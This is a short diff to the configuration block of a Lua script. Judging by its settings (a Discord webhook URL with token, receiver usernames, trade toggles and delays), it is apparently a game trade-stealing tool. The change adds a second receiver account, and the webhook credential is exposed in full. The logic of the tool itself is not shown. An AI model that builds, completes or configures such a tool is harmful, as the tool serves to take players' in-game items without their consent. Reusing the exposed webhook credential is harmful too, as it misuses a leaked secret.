@@ -1,6 +1,6 @@
 -- ===== CONFIG =====
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1546273272574771232/iv5gn_ToOSNRcO_BsSgNmagKg3k6myzuWRet4IQ0TCY__Ym0vk_JVza3nS17nci8BcnE"
-local RECEIVER = "JOSHUA_THE167"
+local RECEIVER = {"JOSHUA_THE167", "Luckyman7778910"}
 local ENABLE_TRADE = true
 local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
